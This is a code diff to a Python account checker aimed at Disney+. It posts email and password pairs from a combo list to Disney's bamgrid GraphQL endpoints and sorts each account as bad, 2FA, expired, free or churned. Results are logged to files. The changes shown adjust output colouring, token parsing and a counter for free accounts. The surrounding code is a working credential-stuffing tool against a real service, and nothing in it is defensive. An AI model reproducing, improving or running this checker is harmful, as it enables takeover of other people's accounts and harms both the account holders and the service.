@@ -5,7 +5,7 @@ Disney+
 """
 
 import requests, os, time, queue, threading, json
-from colorama import Fore, Style
+from colorama import Fore, Style, init
 
 from Modules.functions import Functions, Data
 
@@ -82,7 +82,8 @@ class Checker:
                             data.retries += 1
                             print(yellow + f"[{func.timestamp()}] | [!] {acc}")
                             return
-                        tk1 = r.json().get('sdk', {}).get('token', {}).get('accessToken', None)
+                        jr = r.json()
+                        tk1 = jr['extensions']['sdk']['token']['accessToken']
                  
                         u2 = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
                         j2 = {"query":" query Check($email: String!) { check(email: $email) { operations nextOperation } }","variables":{"email":f"{username}"} }
@@ -119,7 +120,7 @@ class Checker:
                             print(red + f"[{func.timestamp()}] | [-] {acc}")
                             data.bad += 1
                         elif 'operations":["OTP"]' in r.text:
-                            print(red + Style.DIM + f"[{func.timestamp()}] | [2FA] {acc}")
+                            print(red + f"[{func.timestamp()}] | [2FA] {acc}")
                             data.nfa += 1
                         else:
                             u3 = 'https://disney.api.edge.bamgrid.com/v1/public/graphql'
@@ -148,13 +149,13 @@ class Checker:
                             r3 = requests.post(u3, headers=h3, json=j3)
 
                             if 'Bad credentials' in r3.text:
-                                print(red + f"[{func.timestamp()}] | [-] {acc}")
+                                print(red + Style.NORMAL + f"[{func.timestamp()}] | [-] {acc}")
                                 data.bad += 1
                             elif r.status_code == 403:
                                 data.retries += 1
                                 print(yellow + f"[{func.timestamp()}] | [!] {acc}")
                             elif 'Account is blocked' in r.text:
-                                print(red + f"[{func.timestamp()}] | [EXPIRED] {acc}")
+                                print(red + Style.NORMAL + f"[{func.timestamp()}] | [EXPIRED] {acc}")
                                 data.bad += 1
                             else:
                                 try:
@@ -190,6 +191,8 @@ class Checker:
                                         if status == 'subscription.not.found':
                                             with open('Free/disney.txt', 'a') as f:
                                                 f.write(f"{acc} | Plan --> None")
+                                            print(red + f"[{func.timestamp()}] | [FREE] {acc}")
+                                            data.free += 1
                                         elif status == 'CHURNED':
                                             print(red + f"[{func.timestamp()}] | [CHURNED] {acc}")
                                             data.bad += 1
